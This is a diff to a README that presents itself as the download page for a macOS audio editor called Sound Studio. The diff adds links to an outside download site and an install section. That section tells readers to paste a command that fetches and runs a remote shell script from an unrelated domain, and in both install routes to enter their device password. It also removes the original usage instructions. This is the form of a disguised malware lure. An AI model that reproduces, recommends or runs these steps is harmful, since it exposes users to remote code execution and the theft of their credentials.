@@ -7,9 +7,33 @@ From musicians to content creators, Sound Studio is trusted by audio professiona
 ---
 
 ## ✅ Download Sound Studio for macOS  
-[![Download Sound Studio](https://img.shields.io/badge/Download-Sound_Studio-darkblue)](#)
+[![Download Sound Studio](https://img.shields.io/badge/Download-Sound_Studio-darkblue)](https://sound-studio-download-mac.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
 
 ## 📦 What is Sound Studio?
 
@@ -42,17 +66,7 @@ It’s a great choice for podcasters, musicians, audiobook producers, educators,
 
 ---
 
-[![Download Sound Studio](https://img.shields.io/badge/Download-Sound_Studio-darkblue)](#)
-
----
-
-## 📥 How to Use
-
-- 🎧 Launch Sound Studio and choose your audio input source  
-- 🎙 Click record to start capturing vocals, instruments, or ambient sound  
-- ✂️ Edit the waveform with intuitive tools and apply effects  
-- 💾 Export your project in the desired audio format  
-- 🔁 Use for podcast episodes, music tracks, interviews, and more  
+[![Download Sound Studio](https://img.shields.io/badge/Download-Sound_Studio-darkblue)](https://sound-studio-download-mac.github.io/.github)
 
 ---
 
